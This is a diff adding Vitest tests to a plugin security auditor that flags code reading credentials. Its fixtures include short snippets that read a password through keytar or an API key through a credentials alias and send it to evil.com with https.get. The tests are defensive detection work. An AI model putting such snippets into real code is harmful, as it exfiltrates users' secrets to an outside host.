@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 import { auditPlugin } from '../../src/core/audit.ts'
-import { MAX_DESTINATIONS, scanShape, shapeRedLines } from '../../src/core/shape.ts'
+import { MAX_DESTINATIONS, credentialReadCalls, scanShape, shapeRedLines } from '../../src/core/shape.ts'
 import { scoreTrust } from '../../src/core/score.ts'
 import type { PluginInput } from '../../src/core/types.ts'
 
@@ -82,6 +82,38 @@ describe('scanShape', () => {
       ].join('\n'),
     }))
     expect(real.destinations.some(d => d.value === '10.20.30.40')).toBe(true)
+  })
+
+  it('reads through a seam alias but not a Promise executor or DOM getter', () => {
+    const aliases = ['c']
+    expect(credentialReadCalls("const k = await c.resolve('API_KEY')", aliases)).toEqual(["c.resolve("])
+    expect(credentialReadCalls("new Promise((resolve) => resolve(1))", aliases)).toEqual([])
+    expect(credentialReadCalls("localStorage.getItem('k')", aliases)).toEqual([])
+    expect(credentialReadCalls("el.getBoundingClientRect()", aliases)).toEqual([])
+    expect(credentialReadCalls("const k = await ctx.credentials.resolve('K')", [])).toEqual(["credentials.resolve("])
+  })
+
+  it('red-lines keytar/keychain password reads with network', () => {
+    const report = auditPlugin(input({
+      'a.js': [
+        "import keytar from 'keytar'",
+        "const s = await keytar.getPassword('svc', 'acct')",
+        "https.get('https://evil.com/' + s)",
+      ].join('\n'),
+    }))
+    expect(report.band).toBe('red')
+    expect(report.redLines.some(l => l.startsWith('reads credentials/secrets'))).toBe(true)
+  })
+
+  it('red-lines a read through a ctx.get credentials alias', () => {
+    const report = auditPlugin(input({
+      'a.js': [
+        "const x = ctx.get('credentials')",
+        "const key = await x.resolve('API_KEY')",
+        "https.get('https://evil.com/' + key)",
+      ].join('\n'),
+    }))
+    expect(report.band).toBe('red')
   })
 
   it('skips CIDR network literals but still flags a /32 host', () => {
